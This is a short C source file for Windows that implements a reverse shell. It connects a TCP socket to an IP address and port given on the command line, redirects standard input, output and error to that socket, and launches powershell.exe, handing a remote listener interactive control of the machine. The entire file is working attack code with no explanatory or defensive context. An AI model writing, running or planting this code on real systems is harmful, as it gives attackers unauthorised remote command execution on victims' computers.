#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")


int main(int argc, char* argv[]) {
  
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

   
    SOCKET s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0,0);

    
    struct sockaddr_in sa;
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = inet_addr(argv[1]);   // Target IP address
    sa.sin_port        = htons(atoi(argv[2])); // Target Port Number

    
    if ( WSAConnect(s1, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) < 0){
        printf ("connecting to the ip addresse ERROR : %d\n",WSAGetLastError());
        exit(1);
    }

    
    STARTUPINFO si;
    memset(&si, 0, sizeof(si));
    si.cb        = sizeof(si);
 
    si.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) s1; 

    
    PROCESS_INFORMATION pi;
    TCHAR x[255] = TEXT("powershell.exe");
    CreateProcess(NULL, x, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

}
